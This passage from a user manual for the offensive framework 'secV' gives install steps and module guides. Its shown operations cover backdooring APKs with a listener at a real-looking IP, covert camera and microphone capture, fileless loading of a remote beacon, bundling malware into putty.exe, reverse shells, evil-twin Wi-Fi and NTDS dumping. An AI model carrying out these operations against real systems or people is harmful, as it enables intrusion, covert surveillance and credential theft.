1. Boot ISO → select Install (graphical or text mode)
2. Language, keyboard, network
3. Hostname: `secv-ubuntu` or `secv-debian`
4. Create a user and password
5. Partitioning: guided, use entire disk, single partition
6. Software: for Debian, select only "SSH server" and "standard system utilities" - no desktop needed for a headless pentest box; add desktop if you prefer
7. GRUB to primary drive → finish → reboot, remove ISO

**Post-install: secV on Ubuntu / Debian**

```bash
sudo apt update && sudo apt full-upgrade -y

# Replace the outdated system Go with upstream 1.21+
wget -q https://go.dev/dl/go1.21.13.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.21.13.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
go version

# Install secV system dependencies
sudo apt install -y python3 python3-pip git nmap masscan adb apktool \
                    default-jdk jq nodejs aircrack-ng iw wireless-tools \
                    imagemagick ffmpeg smbclient rpcclient

# Metasploit - use the official installer
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb \
  > msfinstall && chmod 755 msfinstall && sudo ./msfinstall
sudo msfdb init

# Python packages for module coverage
pip3 install requests ldap3 scapy paramiko impacket frida-tools \
             bloodhound --break-system-packages

# Bore
curl -L https://github.com/ekzhang/bore/releases/latest/download/bore-x86_64-unknown-linux-musl.tar.gz \
  | tar xz && sudo mv bore /usr/local/bin/

# ADB udev rule
sudo tee /etc/udev/rules.d/51-android.rules <<'EOF'
SUBSYSTEM=="usb", ATTR{idVendor}=="18d1", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="04e8", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="0bb4", MODE="0666", GROUP="plugdev"
EOF
sudo udevadm control --reload-rules && sudo udevadm trigger
sudo usermod -aG plugdev $USER

# Clone and install secV
git clone https://github.com/secvulnhub/secV
cd secV
bash install.sh

./secV --version
./secV -check-deps
```

---

### 12.6 - VM Setup: Fedora

Fedora 40+ ships a sufficiently modern Go in its official repositories, making it the easiest distro to get running after Arch. The catch is that Metasploit is not in the Fedora repos and must be installed from the Rapid7 installer.

**Create the VM**

Same specs: 4 vCPUs, 8 GB RAM, 40 GB disk.

**Download:** `fedoraproject.org/workstation` → Fedora Workstation 40 ISO (or the Server ISO for a headless setup)

**Installation (Anaconda graphical installer)**

1. Boot ISO → **Install to Hard Drive**
2. Language → English
3. Installation Summary:
   - **Installation Destination** → automatic partitioning on your disk
   - **Network & Hostname** → enable the wired interface, hostname: `secv-fedora`
   - **Root Account** → enable, set password
   - **User Creation** → create your user, tick "Make this user administrator"
4. Begin Installation → wait → reboot, remove ISO

**Post-install: secV on Fedora**

```bash
sudo dnf update -y

# Go is current on Fedora - install from repo
sudo dnf install -y golang python3 python3-pip git nmap jq nodejs \
                    aircrack-ng iw android-tools imagemagick ffmpeg

# apktool - not in Fedora repos, install manually
wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool \
     https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar
sudo mv apktool /usr/local/bin/ && sudo mv apktool_*.jar /usr/local/bin/apktool.jar
sudo chmod +x /usr/local/bin/apktool

# Metasploit - Rapid7 installer
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb \
  > msfinstall && chmod 755 msfinstall && sudo ./msfinstall
sudo msfdb init

# Python packages
pip3 install requests ldap3 scapy paramiko impacket frida-tools

# Bore
curl -L https://github.com/ekzhang/bore/releases/latest/download/bore-x86_64-unknown-linux-musl.tar.gz \
  | tar xz && sudo mv bore /usr/local/bin/

# ADB udev rule
sudo tee /etc/udev/rules.d/51-android.rules <<'EOF'
SUBSYSTEM=="usb", ATTR{idVendor}=="18d1", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="04e8", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="0bb4", MODE="0666", GROUP="plugdev"
EOF
sudo udevadm control --reload-rules && sudo udevadm trigger
sudo usermod -aG plugdev $USER

# Clone and install secV
git clone https://github.com/secvulnhub/secV
cd secV
bash install.sh

./secV --version
./secV -check-deps
```

---

## Chapter 13 - First Run

Launch secV:

```bash
./secV        # from repo
secV          # system install
```

You see the banner and prompt:

```
   ███████╗███████╗ ██████╗██╗   ██╗
   ...
secV ❯
```

Try these commands to explore:

```
secV ❯ show modules         # list all available modules
secV ❯ search android       # search by keyword
secV ❯ info netrecon        # detailed info about a module
secV ❯ use netrecon         # load the netrecon module
secV (netrecon) ❯ show options  # what parameters does it have?
secV (netrecon) ❯ back      # unload the module
secV ❯ exit                 # quit
```

Notice the prompt changes when a module is loaded - `secV (netrecon) ❯` tells you which module you're working with. Parameters you set stay set until you `back` out or `set` them again.

**Tab completion is active for everything:** module names, command names, and parameter names all autocomplete when you press Tab.

---

# Part III - Using secV

---

## Chapter 14 - The secV Shell

secV's shell is a purpose-built command interpreter. Every command is one of these:

**Navigation commands:**

| Command | Description |
|---------|-------------|
| `show modules` | List every available module |
| `search <keyword>` | Filter modules by name or category |
| `use <module>` | Load a module and enter its context |
| `back` | Unload current module, return to top-level prompt |
| `reload` | Rescan the `tools/` directory and refresh the module list |
| `info <module>` | Show module details + live dependency status |

**Module interaction commands:**

| Command | Description |
|---------|-------------|
| `show options` | List all parameters, their types, defaults, and current values |
| `set <key> <value>` | Assign a value to a parameter |
| `run <target>` | Execute the module against a target |
| `help module` | Display module-specific help text (from `module.json`) |

**System commands:**

| Command | Description |
|---------|-------------|
| `update` | Pull latest from git + recompile binary |
| `clear` | Clear the terminal screen |
| `exit` | Exit secV |

**Using `set`:**

```
secV (netrecon) ❯ set ports top-100
secV (netrecon) ❯ set mode deep
secV (netrecon) ❯ set threads 30
secV (netrecon) ❯ set output_dir /tmp/scan-results
```

Parameters stay set until you change them. You can see all current values with `show options`.

**The `run` command takes a target:**

```
secV (netrecon) ❯ run 192.168.1.0/24
secV (android_pentest) ❯ run device
secV (adsec) ❯ run 192.168.1.50
```

What "target" means depends on the module. For `netrecon` it's an IP or CIDR. For `android_pentest` it's `device` (connected Android device) or `no_device`. The module's `info` and `show options` tell you what's expected.

**Searching for modules:**

```
secV ❯ search android       # finds android_pentest
secV ❯ search wifi          # finds wifi_monitor
secV ❯ search network       # shows all network-category modules
secV ❯ search recon         # matches netrecon
```

**Getting module info:**

```
secV ❯ info android_pentest
```

This shows version, description, category, dependencies (with ✓/✗ status checked live), and a list of operations/parameters.

---

## Chapter 15 - Running Your First Module

Let's do a real example: scan a local network.

```
secV ❯ use netrecon
secV (netrecon) ❯ show options
```

You see a table of parameters. Most have defaults. The only required one is the target (passed to `run`).

```
secV (netrecon) ❯ set mode normal
secV (netrecon) ❯ set ports top-1000
secV (netrecon) ❯ run 192.168.1.0/24
```

secV builds a JSON payload like:

```json
{
  "target": "192.168.1.0/24",
  "params": {
    "mode": "normal",
    "ports": "top-1000"
  }
}
```

...writes it to the module's stdin, and the module starts working. You see output streaming in real time. When it finishes, secV displays a structured summary.

**Tip:** Tab-complete everything. `use net<Tab>` → `use netrecon`. `set mo<Tab>` → `set mode`. Parameter values are sometimes tab-completed too.

**Tip:** You don't need to `set` every parameter. Any unset parameter uses its default value shown in `show options`.

**Running multiple targets:**

Most modules accept comma-separated targets or CIDR ranges:

```
secV (netrecon) ❯ run 10.0.0.1,10.0.0.5,10.0.0.100
secV (netrecon) ❯ run 192.168.0.0/16
```

---

## Chapter 16 - Parameters Deep Dive

Parameters are how you configure what a module does. They work like settings - each one has a name, a type, and optionally a default value.

**Types:**

| Type | Examples | Notes |
|------|----------|-------|
| `string` | `"normal"`, `"corp.local"`, `"/tmp/file.apk"` | Free text |
| `integer` | `4444`, `100`, `30` | Whole numbers only |
| `float` | `3.0`, `0.5`, `1.5` | Decimal numbers |
| `boolean` | `true`, `false` | On/off switches |

**Setting a boolean:**
```
secV (android_pentest) ❯ set frida true
secV (netrecon) ❯ set os_detection false
```

**Setting a string:**
```
secV (adsec) ❯ set domain corp.local
secV (adsec) ❯ set username analyst
secV (adsec) ❯ set password 'P@ssw0rd!'
```

For values with spaces or special characters, wrap in quotes:
```
secV ❯ set password 'my password with spaces'
```

**Setting an integer:**
```
secV (netrecon) ❯ set threads 50
secV (revshell) ❯ set lport 9001
```

**Viewing current values:**
```
secV (netrecon) ❯ show options
```

Output shows each parameter with its current value (or `[default]` if unchanged):

```
Parameter     Type     Default    Current    Required
-----------   ------   -------    -------    --------
mode          string   normal     deep       no
ports         string   top-1000   top-100    no
threads       int      20         20         no
output_dir    string   -          /tmp/out   no
```

**Parameters persist within a session.** If you `back` and then `use netrecon` again, parameters reset to their defaults. There's no saved state between secV sessions - set your parameters fresh each time.

---

## Chapter 17 - Targets and Output

**Targets** are passed to `run`:

```
secV (netrecon) ❯ run 192.168.1.1         # single IP
secV (netrecon) ❯ run 192.168.1.0/24      # CIDR subnet
secV (netrecon) ❯ run 192.168.1.1-50      # IP range
secV (netrecon) ❯ run example.com         # hostname
secV (netrecon) ❯ run country:de          # all German CIDRs
secV (netrecon) ❯ run asn:AS15169         # all Google prefixes
secV (android_pentest) ❯ run device       # connected device
secV (android_pentest) ❯ run no_device    # no device needed
secV (adsec) ❯ run 192.168.1.50           # DC IP
```

**Output formats:**

Modules print their results to stdout in JSON. secV reads that JSON and formats it for display. You see:
- Summary boxes with key findings
- Tables of discovered hosts, services, vulnerabilities
- Colour-coded severity levels
- File paths for saved reports (HTML, XML, PCAPs)

**Saving output:**

Many modules accept an `output_dir` parameter:

```
secV (netrecon) ❯ set output_dir /tmp/pentest-report
secV (netrecon) ❯ run 192.168.1.0/24
```

After the scan, `/tmp/pentest-report/` contains:
- `report.html` - self-contained HTML report
- `scan.xml` - nmap XML
- `handler.rc` - Metasploit RC file for found services

Modules that generate files (APKs, PCAP captures, hash dumps) always tell you where they saved the output at the end of the run.

---

# Part IV - Every Built-in Module

---

## Chapter 18 - netrecon

**Version:** 1.0.0 | **Category:** network | **Path:** `tools/network/netrecon/`

### What it does

`netrecon` is a multi-engine network reconnaissance tool. It doesn't just wrap nmap - it runs nmap, masscan, rustscan, and arp-scan simultaneously, merges all their results into a unified host model, and then enriches each host with:

- CVEs matched against discovered service versions (via live NVD lookups)
- GeoIP country and ASN data
- SSL certificate domain extraction (CN + SANs from every TLS port)
- Camera fingerprinting (via favicon hash matching - recognises 17 camera models)
- iOS/Apple device detection (port 62078 = lockdownd, mDNS patterns)
- Shodan threat intelligence (if API key provided)
- A self-contained HTML report (no xsltproc or external dependencies needed)

### Quick start

```
secV ❯ use netrecon
secV (netrecon) ❯ run 192.168.1.0/24

# Deep scan with OS detection and saved report
secV (netrecon) ❯ set mode deep
secV (netrecon) ❯ set os_detection true
secV (netrecon) ❯ set output_dir /tmp/scan
secV (netrecon) ❯ run 10.0.0.0/8

# Scan all German IP space (sampled)
secV (netrecon) ❯ set max_hosts 500
secV (netrecon) ❯ run country:de

# Shodan + passive-only (no active probing)
secV (netrecon) ❯ set passive_only true
secV (netrecon) ❯ set shodan_key YOUR_KEY
secV (netrecon) ❯ run 198.51.100.1
```

### Parameters

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `mode` | string | `normal` | `normal` `quick` `deep` `stealth` `evasion` `full` |
| `ports` | string | `top-1000` | `top-100` `top-1000` `web` `db` `iot` `camera` `ics` `all` or custom range like `1-65535` |
| `threads` | integer | `20` | Concurrent scanning threads |
| `rate` | integer | `1000` | Packets/sec for masscan |
| `timeout` | integer | `5` | Per-host timeout in seconds |
| `os_detection` | boolean | `false` | OS fingerprinting (requires root) |
| `vuln_scripts` | boolean | `false` | Run nmap vulnerability NSE scripts |
| `shodan_key` | string | - | Shodan API key |
| `interface` | string | - | Bind to a specific network interface |
| `exclude` | string | - | Comma-separated hosts/CIDRs to skip |
| `passive_only` | boolean | `false` | No active probing - Shodan and DNS only |
| `max_hosts` | integer | `1024` | Max IPs sampled from `country:`/`asn:` targets |
| `evasion` | boolean | `false` | IDS/FW bypass: fragmentation, decoys, source-port spoofing |
| `proxychains` | boolean | `false` | Route nmap through proxychains4 |
| `web_enum` | boolean | `false` | Run gobuster/ffuf on discovered web ports |
| `output_dir` | string | - | Save HTML report, nmap XML, MSF RC file |

### Scan modes

| Mode | Description |
|------|-------------|
| `normal` | Balanced: nmap -sS -sV + masscan + arp-scan |
| `quick` | Fast: masscan only, top 100 ports |
| `deep` | Thorough: all engines, all versions, NSE scripts |
| `stealth` | Slow timing, randomised order, low rate |
| `evasion` | Fragmentation, decoys, TTL manipulation |
| `full` | Deep + web enum + Shodan enrichment |

### Output

- `hosts[]` - per host: IP, hostname, OS, MAC, open ports, services, risk score, country, ASN, CVEs
- `ssl_domains[]` - extracted certificate domains (CDN noise filtered)
- `summary{}` - totals, risk breakdown, OS distribution, high-risk host list
- `outputs{}` - paths to HTML report, nmap XML, MSF RC file

### Feature tiers

- **Minimum (no extras):** TCP connect scan, DNS, WHOIS, ipinfo.io ASN lookup
- **+nmap:** Service/OS detection, NSE scripts
- **+masscan:** Fast SYN scanning (requires root)
- **+cryptography:** Full SSL SAN extraction
- **+geoip2 + GeoLite2 DB:** Offline country/ASN, no rate limits
- **+shodan key:** External threat intelligence
- **+mmh3:** Camera favicon fingerprinting

---

## Chapter 19 - android_pentest

**Version:** 2.4.3 | **Category:** mobile | **Path:** `tools/mobile/android/`

### What it does

`android_pentest` is a full-lifecycle Android security testing suite. It covers every phase from passive recon through active exploitation, persistence, and post-exploitation - for both rooted and non-rooted devices.

The module has two interfaces:
- **CLI mode:** `set operation <op>; run device` - runs a specific operation and returns JSON results
- **GUI mode:** `set mode gui; run` - launches a full web interface at `http://localhost:8897` with an interactive operations panel, live terminal, ADB console, findings tab, live media tab, and embedded C2 dashboard

See the [android_pentest full module manual](tools/mobile/android/README.md) for a complete book-level reference covering everything from "what is an APK" to building new GUI panels.

### Quick start

```
secV ❯ use android_pentest

# GUI mode (recommended - all features accessible)
secV (android_pentest) ❯ set mode gui
secV (android_pentest) ❯ run

# Recon a connected device
secV (android_pentest) ❯ set operation recon
secV (android_pentest) ❯ run device

# Build a WAN C2 APK and serve it via QR code
secV (android_pentest) ❯ set operation rebuild
secV (android_pentest) ❯ run device

# Backdoor an existing APK
secV (android_pentest) ❯ set operation backdoor_apk
secV (android_pentest) ❯ set package com.example.app
secV (android_pentest) ❯ set lhost 161.35.110.36
secV (android_pentest) ❯ set lport 41736
secV (android_pentest) ❯ run connected
```

### Operations

| Operation | What it does |
|-----------|-------------|
| `recon` | Device fingerprint, root status, SELinux, chipset, installed apps |
| `app_scan` | Static APK analysis, manifest audit, security score |
| `vuln_scan` | 50+ checks, OWASP Mobile Top 10, live NVD CVEs |
| `exploit` | Intent injection, SQLi, content provider attacks |
| `network` | Traffic capture, SSL inspection, proxy setup |
| `forensics` | Data extraction, artifact analysis |
| `frida_hook` | Deploy frida-server; SSL unpin, root bypass, credential dump |
| `objection_patch` | Embed Frida gadget into APK (no root at runtime), resign |
| `get_root` | Multi-vector root: Magisk, adb root, CVE-2024-0044, mtk-su, KernelSU |
| `inject_agent` | Push native C agent, receive JSON report via TCP C2 |
| `adb_wifi` | Enable ADB over WiFi, drop USB dependency |
| `deploy_shell` | Generate and install Meterpreter APK |
| `backdoor_apk` | Pull APK, inject msfvenom payload, sign, optionally install |
| `rebuild` | Build BootBuddy WAN C2 APK: BootReceiver + DexClassLoader + bore + QR |
| `persist` | Boot Receiver + Magisk module persistence |
| `hook` | Three-vector persistence: Magisk, SharedUID shell, LSPosed/Zygote |
| `unhook` | Remove all persistence hooks |
| `exploit_cve` | Targeted CVE exploitation (CVE-2024-0044, CVE-2023-45866, etc.) |
| `cve_chain` | Predefined CVE chains: bt_to_root, sandbox_exfil, zero_click_full |
| `zero_click` | Probe zero-click surfaces: BT HID, NFC, WiFi broadcast, media parsing |
| `qr_exploit` | QR code for APK, Intent URI, ADB pairing, deeplink, or WAN bore tunnel |
| `device_net_scan` | Scan device WiFi via netrecon, detect exposed ADB TCP |
| `wan_expose` | Expose MSF listener + APK server via cloudflared or bore |
| `msf_handler` | Launch Metasploit multi/handler + msfrpcd for GUI sessions |
| `screen_mirror` | Live screen mirror: ADB MJPEG stream or MSF screenshot polling |
| `camera_snap` | Capture device camera via ADB or MSF |
| `camera_stream` | Live camera stream: ADB screencap loop or MSF |
| `mic_record` | Record device microphone via ADB or MSF Meterpreter |
| `speaker_push` | Push audio to device speaker (MSF) |
| `full_pwn` | 7-step chain: recon + adb_wifi + get_root + scan + shell + persist + WAN |
| `multi_device` | Run any operation across all connected devices |
| `c2_gui` | Launch web C2 dashboard |
| `c2_cli` | C2 server in CLI mode |
| `shell` | OnlyShell reverse shell handler |
| `full` | Complete assessment: recon + vuln_scan + exploit + network + forensics |

### Key parameters

| Parameter | Default | Description |
|-----------|---------|-------------|
| `operation` | - | Operation to run |
| `device` | auto | ADB device serial |
| `package` | - | Target app package name |
| `mode` | - | Set to `gui` for web interface |
| `lhost` | - | Listener IP for payloads |
| `lport` | `4444` | Listener port |
| `bore_server` | `bore.pub` | Bore relay for WAN mode |
| `apk_path` | - | Explicit APK path |

### bore install (required for WAN mode)

```bash
curl -sL https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-unknown-linux-musl.tar.gz | tar xz -C ~/.local/bin
```

---

## Chapter 20 - ios_pentest

**Version:** 1.0.1 | **Category:** mobile | **Path:** `tools/mobile/ios/`

### What it does

`ios_pentest` connects to iOS devices via libimobiledevice, performs binary protection checks (PIE, stack canary, ARC, encryption), audits ATS and Info.plist configuration, dumps keychain data on jailbroken devices, runs Frida SSL bypass hooks, and performs live NVD keyword searches for version-specific CVEs.

Covers both non-jailbroken (static IPA analysis + libimobiledevice recon) and jailbroken paths (SSH root + Frida + full runtime analysis).

### Quick start

```
secV ❯ use ios_pentest
secV (ios_pentest) ❯ run device       # basic recon

# Jailbroken full assessment
secV (ios_pentest) ❯ set operation full
secV (ios_pentest) ❯ set ssh_host 192.168.1.50
secV (ios_pentest) ❯ set ssl_bypass true
secV (ios_pentest) ❯ run device
```

### Parameters

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `operation` | string | `recon` | `recon` `app_scan` `vuln_scan` `exploit` `shell` `full` |
| `udid` | string | - | Device UDID (auto-detect if single device) |
| `bundle_id` | string | - | Target app bundle ID |
| `ipa_path` | string | - | Path to local IPA for static analysis |
| `ssh_host` | string | - | Jailbroken device IP |
| `ssh_port` | integer | `22` | SSH port |
| `ssh_user` | string | `root` | SSH user |
| `ssh_pass` | string | `alpine` | SSH password (default for checkra1n/unc0ver) |
| `search_secrets` | boolean | `true` | Scan for hardcoded secrets |
| `deep_analysis` | boolean | `false` | Extended binary analysis |
| `ssl_bypass` | boolean | `false` | Frida SSL pinning bypass |
| `frida` | boolean | `false` | Enable Frida instrumentation |
| `nvd_api_key` | string | - | NVD API key (higher rate limit) |

**Prerequisites:**
- Non-jailbroken: `libimobiledevice` system package + local IPA file
- Jailbroken: + SSH root access + frida-server running on device

---

## Chapter 21 - adsec

**Version:** 1.0.2 | **Category:** AD | **Path:** `tools/AD/linux/`

### What it does

`adsec` is a single-tool, full-chain Active Directory pentest module. It covers everything from unauthenticated discovery (no credentials needed) through Kerberoasting, AS-REP roasting, lockout-aware password spraying, BloodHound collection, vulnerability checks (Zerologon, PetitPotam, NoPac, MachineAccountQuota, ADCS), share looting (GPP cpassword, KeePass, SSH keys, unattend.xml), and SAM/LSA/NTDS extraction.

**Pure-Python fallbacks** via `impacket` + `ldap3` mean it works without dozens of external CLIs installed.

**Lockout safety** is on by default - `safe_spray=true` pulls the domain password policy first and leaves a 2-attempt buffer below the lockout threshold. `krbtgt`, `Administrator`, and `Guest` are always excluded from sprays.

### Quick start

```
secV ❯ use adsec

# Unauthenticated discovery
secV (adsec) ❯ set operation discover
secV (adsec) ❯ run 192.168.1.50

# AS-REP roast (no creds needed):
secV (adsec) ❯ set operation asreproast
secV (adsec) ❯ set domain corp.local
secV (adsec) ❯ set userlist /tmp/users.txt
secV (adsec) ❯ run 192.168.1.50

# Full safe pipeline with low-priv creds:
secV (adsec) ❯ set operation auto
secV (adsec) ❯ set domain corp.local
secV (adsec) ❯ set username analyst
secV (adsec) ❯ set password 'P@ss123'
secV (adsec) ❯ run 192.168.1.50

# Pass-the-hash NTDS dump (DA required):
secV (adsec) ❯ set operation secrets
secV (adsec) ❯ set domain corp.local
secV (adsec) ❯ set username admin
secV (adsec) ❯ set hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
secV (adsec) ❯ run 192.168.1.50
```

### Operations

| Operation | Auth Required | What it does |
|-----------|--------------|-------------|
| `discover` | none | DC fingerprint, domain SID, OS, NetBIOS, anonymous SMB/LDAP |
| `users` | none / low-priv | LDAP user enum + SAMR RID brute fallback |
| `groups` | low-priv | Domain group enumeration with members |
| `shares` | none / low-priv | Share inventory with READ/WRITE tests |
| `passpol` | none | Domain password policy via SAMR |
| `kerberoast` | low-priv | TGS hash dump for SPN-bearing accounts (hashcat -m 13100) |
| `asreproast` | none (just userlist) | AS-REP hash dump for users without preauth (hashcat -m 18200) |
| `spray` | userlist | Lockout-aware password spraying via SMB |
| `vulncheck` | none | Zerologon, PetitPotam, NoPac, MAQ, SMBv1, SMB signing, ADCS |
| `bloodhound` | low-priv | BloodHound JSON zip via bloodhound-python |
| `loot` | low-priv | Sensitive file hunt across readable shares |
| `secrets` | DA / local-admin | secretsdump SAM/LSA/NTDS via impacket |
| `exec` | low-priv | Execute a shell command via wmiexec/WMI |
| `privesc_check` | low-priv | Unquoted paths, writable binaries, UAC, stored creds |
| `shell` | optional | OnlyShell handler; auto-deliver via wmiexec if creds available |
| `office_macros` | none | Generate VBA macro templates (download_exec, persistence, etc.) |
| `auto` | varies | Full safe pipeline with available context |

---

## Chapter 22 - winadsec

**Version:** 1.0.2 | **Category:** AD | **Path:** `tools/AD/windows/`

### What it does

`winadsec` handles Windows-side AD post-exploitation. Where `adsec` runs from a Linux attack box against an AD environment, `winadsec` is for after you've compromised a Windows host and need to escalate, persist, move laterally, and exfiltrate within the domain.

Key capabilities: UAC bypass, WMI persistence, Sliver C2 session management, ISO payload generation, fileless in-memory PE loading (no disk touch), EXE bundling into legitimate wrappers (PyInstaller), Office macro generation, and a full reverse shell handler.

### Quick start

```
secV ❯ use winadsec

# UAC bypass
secV (winadsec) ❯ set operation uac_bypass
secV (winadsec) ❯ run 192.168.1.50

# Auto-deliver reverse shell via WMI
secV (winadsec) ❯ set operation shell
secV (winadsec) ❯ set username admin
secV (winadsec) ❯ set password 'P@ss123'
secV (winadsec) ❯ set lhost 10.10.10.10
secV (winadsec) ❯ run 192.168.1.50

# Fileless in-memory EXE
secV (winadsec) ❯ set operation fileless_pe
secV (winadsec) ❯ set url http://10.10.10.10/beacon.exe
secV (winadsec) ❯ run 192.168.1.50

# Bundle malware into a legit EXE
secV (winadsec) ❯ set operation inject_exe
secV (winadsec) ❯ set mal_exe /tmp/beacon.exe
secV (winadsec) ❯ set legit_exe /tmp/putty.exe
secV (winadsec) ❯ run 192.168.1.50
```

---

## Chapter 23 - websec

**Version:** 2.4.1 | **Category:** web | **Path:** `tools/web/websec/`

### What it does

`websec` is a full-stack web attack surface tool. It combines OSINT (DNS, WHOIS, SSL, Wayback), active scanning (headers, CORS, cookies, directories, SQLi, XSS, CSRF, 403 bypass, open redirect), framework CVEs (Jira, AEM, Confluence), WordPress attack surface, WAF fingerprinting, web spidering, Google dorks, and a stealth layer (UA rotation, delay/jitter, proxy/Tor).

Everything uses pure Python `requests` - no Burp, no browser, no GUI required.

### Quick start

```
secV ❯ use websec

# Full recon
secV (websec) ❯ set operation recon
secV (websec) ❯ run https://example.com

# SQLi with stealth + Tor + WAF evasion
secV (websec) ❯ set operation sqli
secV (websec) ❯ set stealth true
secV (websec) ❯ set proxy socks5://127.0.0.1:9050
secV (websec) ❯ set delay 0.5
secV (websec) ❯ set jitter 1.5
secV (websec) ❯ set waf_evasion true
secV (websec) ❯ set test_url https://example.com/search?q=test
secV (websec) ❯ run https://example.com

# WordPress attack surface
secV (websec) ❯ set operation wordpress
secV (websec) ❯ run https://example.com

# Generate PHP reverse shell payloads
secV (websec) ❯ set operation php_payload
secV (websec) ❯ set php_type all
secV (websec) ❯ set lhost 10.10.14.1
secV (websec) ❯ run https://example.com
```

### Operations

| Operation | Description |
|-----------|-------------|
| `recon` | DNS, WHOIS, SSL cert, robots.txt, Wayback, tech stack |
| `headers` | Security headers audit (HSTS, CSP, X-Frame-Options, etc.) |
| `cors` | CORS wildcard, origin reflection, credentials misconfig |
| `cookies` | Cookie flag audit: Secure, HttpOnly, SameSite |
| `dirs` | Directory brute-force with 100+ built-in paths + custom wordlist |
| `sqli` | Error-based + time-blind SQLi; WAF-evasion variants |
| `xss` | Reflected XSS; WAF-evasion variants |
| `csrf` | CSRF token detection across homepage + common form paths |
| `bypass_403` | 403 bypass via header injection and path manipulation |
| `open_redirect` | Open redirect via 12+ common redirect parameter names |
| `framework_cves` | Jira/AEM/Confluence CVE path probing (15+ known CVE paths) |
| `file_upload` | File upload form and endpoint detection |
| `rate_limit` | Rate limit enforcement check |
| `spider` | Crawl site breadth-first, map URLs, forms, JS files |
| `dork` | Generate 18+ Google dork queries + OSINT resource links |
| `ssl` | TLS version, cipher suites, cert details, expiry |
| `waf` | WAF fingerprinting: Cloudflare, AWS, ModSecurity, Akamai, Imperva, F5 |
| `wordpress` | WP attack surface: user enum, xmlrpc, plugins, version |
| `stealth` | Show stealth config, test proxy reachability |
| `php_payload` | PHP reverse shell, webshell, cmd page, or obfuscated payload |
| `msf_payload` | msfvenom web payloads (php/war/jsp/aspx) + handler.rc |
| `fuzz` | Directory fuzzing - auto-picks ffuf, gobuster, or dirbuster |
| `burp_export` | Raw HTTP request, Burp scope JSON, intruder payload list |
| `shell` | Generate 30+ reverse shell one-liners; start OnlyShell handler |
| `full` | All checks in one pass |

---

## Chapter 24 - wifi_monitor

**Version:** 2.1.0 | **Category:** network | **Path:** `tools/network/wifi_monitor/`

### What it does

`wifi_monitor` is a full-stack WiFi attack and monitoring suite. It wraps the aircrack-ng toolchain, hostapd, hcxdumptool, reaver, hashcat, bettercap, and the OnlyShell reverse shell handler into a single module with 23 distinct modes covering every phase of wireless assessment.

**Requires root** - `sudo secV` - because monitor mode and packet injection require elevated privileges.

### Quick start

```
sudo secV
secV ❯ use wifi_monitor

# Passive scan
secV (wifi_monitor) ❯ set mode wifi_scan
secV (wifi_monitor) ❯ set iface wlan0
secV (wifi_monitor) ❯ run target

# Capture WPA2 handshake
secV (wifi_monitor) ❯ set mode capture
secV (wifi_monitor) ❯ set bssid AA:BB:CC:DD:EE:FF
secV (wifi_monitor) ❯ set channel 6
secV (wifi_monitor) ❯ run target

# PMKID → crack pipeline in one shot
secV (wifi_monitor) ❯ set mode auto_crack
secV (wifi_monitor) ❯ set bssid AA:BB:CC:DD:EE:FF
secV (wifi_monitor) ❯ run target

# Evil-twin with captive portal
secV (wifi_monitor) ❯ set mode evil_twin
secV (wifi_monitor) ❯ set essid FreeWiFi
secV (wifi_monitor) ❯ set deliver_via_evil_twin true
secV (wifi_monitor) ❯ run target
```

### Modes

| Mode | Description |
|------|-------------|
| `auto` | Full assessment pipeline |
| `monitor_on` / `monitor_off` | Switch interface monitor mode |
| `inject_test` | Test packet injection capability |
| `wifi_scan` | Passive AP + client listing |
| `capture` | Capture to PCAP |
| `handshake_check` | Verify 4-way handshake in PCAP |
| `deauth` | Deauth clients from AP |
| `wep_attack` | WEP key recovery |
| `evil_twin` | Rogue AP + DHCP/DNS + optional captive portal |
| `mitm` | ARP spoofing MITM via bettercap |
| `wps_scan` | Enumerate WPS-enabled APs |
| `wps_attack` | WPS PIN brute-force via reaver |
| `pmkid` | Capture PMKID frames (no deauth required) |
| `crack` | Crack PCAP with hashcat |
| `auto_crack` | PMKID capture → crack in one command |
| `decrypt` | Decrypt PCAP given PSK |
| `scan` | LAN recon: ARP + ports + device fingerprint |
| `shell` | OnlyShell handler + optional payload via evil-twin portal |

---

## Chapter 25 - mac_spoof

**Version:** 2.2.0 | **Category:** network | **Path:** `tools/network/mac_spoof/`

### What it does

`mac_spoof` manages per-interface background daemons that rotate your MAC address on a configurable schedule. Features: active connection tracking (won't rotate while you have live TCP connections), vendor OUI spoofing (looks like real Apple/Samsung/Intel hardware), stealth mode (rotate only on disconnect), persistent systemd service support, and rotation history logging.

**Requires root** - `sudo secV`.

### Quick start

```
sudo secV
secV ❯ use mac_spoof

# Start rotating every 5 minutes
secV (mac_spoof) ❯ set iface wlan0
secV (mac_spoof) ❯ set interval 300
secV (mac_spoof) ❯ run localhost

# Spoof as Apple hardware (one-time, no daemon)
secV (mac_spoof) ❯ set action vendor
secV (mac_spoof) ❯ set vendor apple
secV (mac_spoof) ❯ run localhost

# Stop daemon and restore original MAC
secV (mac_spoof) ❯ set action stop
secV (mac_spoof) ❯ run localhost
```

### Actions

| Action | Description |
|--------|-------------|
| `start` | Start rotation daemon |
| `stop` | Kill daemon, restore original MAC |
| `status` | Current MAC, original, PID, uptime, rotation count |
| `vendor` | Apply one vendor-spoofed MAC (no daemon) |
| `restore` | Restore original MAC (keeps daemon running) |
| `history` | Show rotation log |

---

## Chapter 26 - revshell

**Version:** 1.0.1 | **Category:** network | **Path:** `tools/network/revshell/`

### What it does

